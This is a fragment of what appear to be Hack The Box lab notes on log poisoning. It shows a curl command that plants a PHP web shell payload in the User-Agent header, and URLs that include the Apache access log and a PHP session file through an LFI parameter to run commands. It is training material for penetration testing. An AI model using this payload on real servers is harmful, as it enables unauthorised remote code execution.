...
```shell-session
xF1NN@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
xF1NN@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
...
http://94.237.48.12:47315/index.php?language=/var/lib/php/sessions/sess_scbno8es4j8aavol2ramvt4r87

http://94.237.48.12:47315/index.php?language=/var/log/apache2/access.log
